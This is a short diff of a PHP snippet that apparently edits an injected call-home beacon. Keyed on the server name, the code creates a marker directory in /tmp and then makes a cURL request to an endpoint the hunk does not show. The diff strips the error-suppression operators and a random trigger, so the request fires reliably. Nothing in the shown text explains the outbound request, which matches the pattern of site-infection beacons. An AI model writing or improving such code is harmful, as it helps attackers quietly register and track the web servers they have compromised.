@@ -1,9 +1,9 @@
 <?php
 $d=$_SERVER['SERVER_NAME'];
-@if(filesize('/tmp/conf'.$d)) { } else {
-@mkdir('/tmp/conf'.$d);
-$sayi = rand(1);
-if($sayi == 1) {
+if(filesize('/tmp/conf'.$d)) { } else {
+	mkdir('/tmp/conf'.$d);
+	
+	
   $curl3 = curl_init();
  curl_setopt_array($curl3, [
     CURLOPT_RETURNTRANSFER => 1,
@@ -12,4 +12,4 @@ if($sayi == 1) {
 ]);
  $resp3 = curl_exec($curl3);
  curl_close($curl3);	
-}} ?>	
+} ?>	
